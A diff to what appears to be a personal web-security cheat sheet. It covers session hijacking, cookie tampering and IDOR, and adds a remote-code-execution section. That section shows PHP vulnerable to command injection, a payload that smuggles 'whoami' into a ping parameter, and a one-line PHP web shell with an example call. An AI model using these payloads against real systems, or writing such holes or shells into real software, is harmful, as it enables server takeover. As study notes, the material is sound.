@@ -3,8 +3,11 @@
 
 
 ## Common
-**session hijacking**
+**Session hijacking**
 Set Cookie: session_id = Auth_key | If the admin **auth_key** is on the front end, it's possible to login as admin without credidentals
+
+
+
 
 
 **Cookie tampering**
@@ -13,11 +16,31 @@ Some websites might encode cookies so encode *Cookie: logged_in=true; admin=true
 
 
 **Insecure Direct Object Reference(IDOR)**
-
 _IDOR is a vulnerability that occurs when internal object are exposed without proper authorization checks._
 
   - INSPECT ELEMENT -> NETWORK -> customer_id.json -> id:10 USERNAME: name PASSWORD: password
   - example.com/profile?user_id=1 -> exploits the ID number -> example.com/profile?user_id=666
+
+
+## Remote code execution
+*a vulnerability that enables attackers to run malicious code on a target server through a web application or network service*
+**VULNERABLE CODE**
+```
+<?php
+$output = shell_exec("ping -c 1 " . $_GET['ip']);
+echo $output;
+?>
+```
+
+**EXPLOIT**
+`example.com/ping.php?ip=127.0.0.1; whoami`
+
+Or you can upload your own malicious file and use that to run your own commands.
+
+Malicious.php
+    <?php system($_GET['cmd']); ?>
+
+`example.com/uploads/malicious.php?cmd=whoami`
 
 ## Cros-site scripting (XSS)
 *Cross-Site Scripting is a vulnerability that allows attackers to inject malicious scripts into web pages when user input is not properly sanitized or encoded.*
